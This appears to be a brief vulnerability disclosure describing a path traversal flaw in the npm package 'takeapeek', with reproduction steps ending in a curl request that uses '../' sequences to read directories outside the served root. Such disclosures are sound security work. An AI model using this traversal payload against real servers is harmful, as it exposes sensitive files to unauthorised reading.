# Vulnerability

## Vulnerability Description

Attacker was able to exploit path traversal and view sensitive directory and files.

## Steps To Reproduce:

- `npm i takeapeek`
- `node node_modules/takeapeek/dist/bin.js`
- `curl --path-as-is http://localhost:3141/../../../../../../`
